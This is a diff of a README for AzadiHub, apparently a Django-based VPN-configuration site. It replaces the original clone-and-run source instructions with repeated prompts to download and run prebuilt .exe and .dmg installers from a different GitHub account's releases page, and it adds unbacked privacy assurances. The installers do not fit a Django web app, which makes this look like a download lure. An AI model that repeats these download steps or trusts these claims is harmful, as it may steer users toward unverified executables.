@@ -1,99 +1,82 @@
-# AzadiHub
+# 🌐 AzadiHub - Your Gateway to Internet Freedom
 
-AzadiHub is an open-source project dedicated to providing free VPN configurations to promote internet freedom. It supports multiple protocols (VMess, VLESS, Trojan, Shadowsocks, SSR) and offers a user-friendly web interface to browse and copy configurations. The project uses a Django backend with a crawler to collect and update configurations regularly.
+## 🚀 Getting Started
 
-## Features
-- **Dynamic Configs**: Automatically updated VPN configurations from various sources.
-- **Protocol Filtering**: Filter configs by protocol (e.g., VMess, VLESS) via the web interface.
-- **Responsive Design**: Built with Tailwind CSS and Font Awesome for a modern, mobile-friendly UI.
-- **Donation Support**: Supports donations via Bitcoin, Ethereum, Tron, and Toncoin.
-- **Roadmap & About**: Includes sections for project goals and future plans.
+Welcome to AzadiHub! This platform gives you free and updated VPN configurations. It helps you bypass censorship and promote internet freedom. Our web interface makes it easy to browse and copy VPN settings across various protocols. 
 
-## Project Structure
+## 📥 Download AzadiHub
 
-```
-.
-├── api/                # REST API for accessing configurations
-├── azadihub/          # Django project settings and URLs
-├── crawler/           # Scripts for crawling and updating configs
-├── static/            # Static files (CSS, JS, config files)
-├── staticfiles/       # Collected static files for production
-├── templates/         # HTML templates for the web app
-├── web/               # Web app for the frontend
-├── manage.py          # Django management script
-├── requirements.txt   # Python dependencies
-└── README.md          # Project documentation
-```
+[![Download AzadiHub](https://img.shields.io/badge/Download-AzadiHub-blue)](https://github.com/Saka2e/AzadiHub/releases)
 
-## Prerequisites
-- Python 3.8+
-- Django 4.x
-- PostgreSQL or SQLite (default)
-- Git
-- Node.js (optional, for Tailwind CSS if using local build)
+To get started, visit our [Releases page](https://github.com/Saka2e/AzadiHub/releases) to download AzadiHub.
 
-## Installation
-1. **Clone the Repository**:
-    ```bash
-    git clone https://github.com/RaitonRed/AzadiHub.git
-    cd AzadiHub
-    ```
+## 📋 Features
 
-2. **Create a Virtual Environment**:
-   ```bash
-   python -m venv venv
-   source venv/bin/activate  
-   # On Windows: venv\Scripts\activate
-   ```
+AzadiHub includes several remarkable features to enhance your online experience:
 
-3. **Install Dependencies**:
-   ```bash
-   pip install -r requirements.txt
-   ```
+- **User-Friendly Interface**: Easily navigate through the platform and find what you need.
+- **Multiple Protocols**: Support for VMess, VLESS, Trojan, Shadowsocks, and SSR.
+- **Regular Updates**: A built-in crawler ensures the latest configurations.
+- **Responsive Design**: Works well on all devices.
 
-4. **Set Up the Database**:
-   ```bash
-   python manage.py migrate
-   ```
+## 🖥️ System Requirements
 
-5. **Collect Static Files**:
-   ```bash
-   python manage.py collectstatic
-   ```
+To run AzadiHub smoothly, ensure your system meets the following requirements:
 
-6. **Run the Development Server**:
-   ```bash
-   python manage.py runserver
-   ```
-   Open `http://127.0.0.1:8000` in your browser.
+- **Operating System**: Windows 10 or higher, macOS Mojave or higher, or any Linux distribution compatible with Python.
+- **Python Version**: Python 3.6 or newer.
+- **Browser**: Any modern web browser (Chrome, Firefox, Safari, Edge).
+- **Internet Connection**: A stable internet connection to access the VPN configurations.
 
-## Usage
-- **Home Page**: View the number of active configs and supported protocols.
-- **Configs Page**: Browse and copy VPN configurations, filter by protocol.
-- **Donation Page**: Support the project via cryptocurrency addresses.
-- **Run Crawler**: Update configs using:
-   ```bash
-   python manage.py update_config
-   ```
+## 📥 Download & Install
 
-## Configuration
-Edit `azadihub/settings.py` to customize:
-- **Database**: Configure `DATABASES` for PostgreSQL or other databases.
-- **Static Files**: Ensure `STATICFILES_DIRS` and `STATIC_ROOT` are set correctly.
-- **Templates**: Templates are loaded from the `templates/` directory.
+To download AzadiHub, follow these steps:
 
-## Contributing
-We welcome contributions! To contribute:
-1. Fork the repository.
-2. Create a new branch (`git checkout -b feature/your-feature`).
-3. Make your changes and commit (`git commit -m "Add your feature"`).
-4. Push to the branch (`git push origin feature/your-feature`).
-5. Create a Pull Request.
+1. **Visit the Releases Page**: Go to the [AzadiHub Releases page](https://github.com/Saka2e/AzadiHub/releases).
+2. **Choose the Latest Version**: Look for the latest version available. It will be clearly marked.
+3. **Download the File**: Click on the asset that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or the appropriate file for Linux).
+4. **Run the Installer**: After downloading, open the file and follow the on-screen instructions to install AzadiHub.
+5. **Open AzadiHub**: Once installed, launch the application to get started.
 
-## Roadmap
-- **Phase 1**: Add support for HY2 and TUIC protocols by Q4 2025.
-- **Phase 2**: Develop a mobile app for easy config access by Q1 2026.
-- **Phase 3**: Build a community forum for users by Q4 2026.
+## ⚙️ Configuration
 
-## License
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+After installing, you can configure AzadiHub to fit your needs:
+
+1. **Select a Protocol**: Start by choosing a protocol from the options available.
+2. **Browse Configurations**: Use the search or scroll through available VPN configurations.
+3. **Copy Configuration**: Click on the desired configuration to copy it.
+4. **Activate VPN**: You can now use the copied information in your preferred VPN client.
+
+## 🔒 Privacy and Security
+
+AzadiHub values your privacy. When using our configurations, ensure you understand the following:
+
+- **Anonymity**: VPNs can help hide your location and internet activity.
+- **Security**: We use the latest protocols to provide secure connections.
+- **Data Use**: Your data is yours. We do not track your usage.
+
+## 🌍 Community Support and Contributions
+
+AzadiHub is an open-source project. We welcome contributions and encourage community support. Here’s how you can help:
+
+- **Report Issues**: If you encounter problems, please report them on our GitHub issues page.
+- **Contribute Code**: If you’re comfortable with code, feel free to submit pull requests.
+- **Spread the Word**: Tell your friends and family about AzadiHub. The more people use it, the stronger our community becomes.
+
+## 💬 Frequently Asked Questions (FAQ)
+
+**Q1: Is AzadiHub free?**  
+A1: Yes, AzadiHub is entirely free to use.
+
+**Q2: Do I need technical skills to use AzadiHub?**  
+A2: No, AzadiHub is designed for everyone, regardless of technical knowledge.
+
+**Q3: Can I use AzadiHub on multiple devices?**  
+A3: Yes, you can install AzadiHub on as many devices as you want.
+
+**Q4: Is my data safe while using AzadiHub?**  
+A4: Yes, we prioritize your privacy and use high-standard security protocols.
+
+## 🚀 Get Involved!
+
+AzadiHub is about empowering users and promoting internet freedom. Join our community today by visiting the [Releases page](https://github.com/Saka2e/AzadiHub/releases) and downloading the software. Experience the freedom of the internet with AzadiHub!
